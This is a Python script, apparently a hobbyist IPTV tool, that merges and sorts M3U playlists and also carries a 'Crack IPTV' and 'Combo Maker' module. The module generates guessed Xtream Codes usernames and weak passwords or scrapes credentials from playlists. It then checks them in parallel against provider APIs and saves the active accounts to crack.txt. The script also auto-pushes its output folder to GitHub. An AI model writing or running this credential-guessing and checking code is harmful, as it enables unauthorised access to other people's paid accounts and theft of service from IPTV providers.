import requests
import os
import re
import concurrent.futures
import threading
import json
import subprocess
from datetime import datetime
from rich.console import Console
from rich.table import Table
from rich.panel import Panel

console = Console()

# --- Configs ---
OUTPUT_DIR = "output"
ALL_SOURCE_TXT = "allsource.txt"
CRACK_FILE = "crack.txt"
COMBO_FILE = "iptv_combo.txt"

class SM_IPTV_Supreme:
    def __init__(self):
        self.hits = 0
        self.lock = threading.Lock()
        os.makedirs(OUTPUT_DIR, exist_ok=True)

    def banner(self):
        os.system('clear')
        banner = """
[bold cyan]╔══════════════════════════════════════════════════════════════╗
║                ⚡ SM IPTV CUSTOMIZE SUPREME ⚡               ║
║           [white]Final Fixed | No Error | Ultra Advance[/white]          ║
╚══════════════════════════════════════════════════════════════╝[/bold cyan]
"""
        console.print(banner)

    def github_sync(self):
        """Auto push without getting stuck in login prompt"""
        if os.path.exists(".git"):
            try:
                console.print("[dim][*] Updating GitHub... (Make sure PAT is configured)[/dim]")
                # Using --force and checking for errors
                subprocess.run("git add . && git commit -m 'Auto-Update' && git push -u origin main", shell=True)
            except:
                console.print("[red][!] GitHub Sync Failed. Please login to Git manually once.[/red]")

    def parse_m3u(self, urls_str):
        """Strong parser for multiple comma separated links"""
        all_channels = []
        # Split by comma and clean spaces
        urls = [u.strip() for u in urls_str.split(",") if u.strip()]
        
        for url in urls:
            try:
                console.print(f"[dim][~] Loading: {url[:50]}...[/dim]")
                r = requests.get(url, timeout=20)
                if r.status_code == 200:
                    content = r.text
                    # regex to get group, name and link strictly
                    matches = re.findall(r'#EXTINF:.*?(?:group-title="(.*?)")?.*?,(.*?)\n(http.*?)(?:\n|$)', content)
                    for cat, name, link in matches:
                        cat = cat if cat else "Others"
                        # Filter Adult content as per your request
                        if not any(x in name.lower() for x in ["adult", "sex", "porn", "xxx", "18+"]):
                            all_channels.append({"cat": cat, "name": name.strip(), "link": link.strip()})
                else:
                    console.print(f"[red][!] Error {r.status_code} for link.[/red]")
            except Exception as e:
                console.print(f"[red][!] Connection Error for link.[/red]")
        return all_channels

    # --- 1. All Channel ---
    def all_channel_export(self, urls_str):
        channels = self.parse_m3u(urls_str)
        path = os.path.join(OUTPUT_DIR, "all_channels.m3u")
        
        existing_links = set()
        if os.path.exists(path):
            with open(path, "r") as f: existing_links = set(re.findall(r'http[^\s]+', f.read()))

        with open(path, "a", encoding="utf-8") as f:
            if not existing_links: f.write("#EXTM3U\n")
            for ch in channels:
                if ch['link'] not in existing_links:
                    f.write(f"#EXTINF:-1,{ch['name']}\n{ch['link']}\n")
                    existing_links.add(ch['link'])
        
        console.print(f"[green]✔ Total {len(channels)} unique channels processed.[/green]")
        self.github_sync()

    # --- 2. Custom Channel (Dynamic Serial) ---
    def custom_folder_export(self, urls_str):
        channels = self.parse_m3u(urls_str)
        categories = sorted(list(set([ch['cat'] for ch in channels])))
        
        console.print("\n[bold yellow]Available Categories:[/bold yellow]")
        for i, cat in enumerate(categories, 1):
            print(f"{i}. {cat}")
        
        selection = input("\nEnter Numbers (e.g., 125): ")
        selected_indices = [int(i)-1 for i in selection if i.isdigit() and 0 < int(i) <= len(categories)]

        for idx in selected_indices:
            cat_name = categories[idx]
            cat_file = os.path.join(OUTPUT_DIR, f"{cat_name.replace(' ', '_')}.m3u")
            
            existing_links = set()
            if os.path.exists(cat_file):
                with open(cat_file, "r") as f: existing_links = set(re.findall(r'http[^\s]+', f.read()))

            with open(cat_file, "a", encoding="utf-8") as f:
                if not existing_links: f.write("#EXTM3U\n")
                for ch in channels:
                    if ch['cat'] == cat_name and ch['link'] not in existing_links:
                        f.write(f"#EXTINF:-1,{ch['name']}\n{ch['link']}\n")
                        existing_links.add(ch['link'])
            console.print(f"[green]✔ {cat_name} category updated.[/green]")
        self.github_sync()

    # --- 5. Crack IPTV (Fixed) ---
    def check_worker(self, combo):
        try:
            if "/get.php?" not in combo: return
            base = combo.split("/get.php")[0]
            params = combo.split("?")[1]
            api = f"{base}/player_api.php?{params}"
            
            r = requests.get(api, timeout=10).json()
            if r.get("user_info", {}).get("status") == "Active":
                exp = r["user_info"].get("exp_date")
                exp_date = datetime.fromtimestamp(int(exp)).strftime('%Y-%m-%d') if exp else "Unlimited"
                
                # Success details
                info = f"URL: {combo} | Exp: {exp_date} | Active"
                with self.lock:
                    self.hits += 1
                    with open(CRACK_FILE, "a") as f: f.write(info + "\n")
                console.print(f"[bold green][SUCCESS] {info}[/bold green]")
        except: pass

    # --- 6. Combo Maker (Ultra Advance) ---
    def combo_maker(self):
        self.banner()
        print("1. Auto Generate (Domain/Pattern based)")
        print("2. Custom (Extract from M3U link/file)")
        c = input("\nChoice: ")
        
        if c == "1":
            link = input("Enter Xtream Link (Host): ")
            prefix = input("Enter Name Pattern (e.g., Jahid): ")
            try:
                host = re.search(r'(http://[^\s/:]+:\d+)', link).group(1)
                combos = set()
                # Advance years and common pass patterns
                for year in range(2023, 2027):
                    u = f"{prefix}{year}"
                    for p in [u, f"{prefix}123", f"{prefix}2025", "123456", "123123"]:
                        combos.add(f"{host}/get.php?username={u}&password={p}&type=m3u_plus")
                with open(COMBO_FILE, "w") as f:
                    for line in combos: f.write(line + "\n")
                console.print(f"[green]✔ {len(combos)} Advance combos saved in {COMBO_FILE}[/green]")
            except: print("Invalid Link.")
            
        elif c == "2":
            source = input("Enter M3U Link or File Path: ")
            data = ""
            if source.startswith("http"): data = requests.get(source).text
            elif os.path.exists(source): data = open(source, 'r', errors='ignore').read()
            
            matches = re.findall(r'(http://[^\s/:]+:\d+)/get\.php\?username=([^\s&]+)&password=([^\s&]+)', data)
            unique = set([f"{h}/get.php?username={u}&password={p}&type=m3u_plus" for h, u, p in matches])
            with open(COMBO_FILE, "w") as out:
                for line in unique: out.write(line + "\n")
            console.print(f"[green]✔ {len(unique)} Combos Extracted.[/green]")

    def menu(self):
        while True:
            self.banner()
            print("1. All Channel (Clean)")
            print("2. Custom Folder (Dynamic Category)")
            print("3. Source Code Copy (to allsource.txt)")
            print("4. Source All (Manual Sync)")
            print("5. Crack IPTV (Fixed Checker)")
            print("6. Combo Maker (Advanced)")
            print("0. Exit")
            
            opt = input("\n[>] Choice: ")
            if opt == "1": self.all_channel_export(input("Enter M3U Links: "))
            elif opt == "2": self.custom_folder_export(input("Enter M3U Links: "))
            elif opt == "5":
                p = input("Combo Path: ")
                if os.path.exists(p):
                    links = open(p, "r").read().splitlines()
                    console.print(f"[yellow][*] Scanning {len(links)} accounts...[/yellow]")
                    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex: ex.map(self.check_worker, links)
            elif opt == "6": self.combo_maker()
            elif opt == "0": break
            input("\nPress Enter to Menu...")

if __name__ == "__main__":
    SM_IPTV_Supreme().menu()
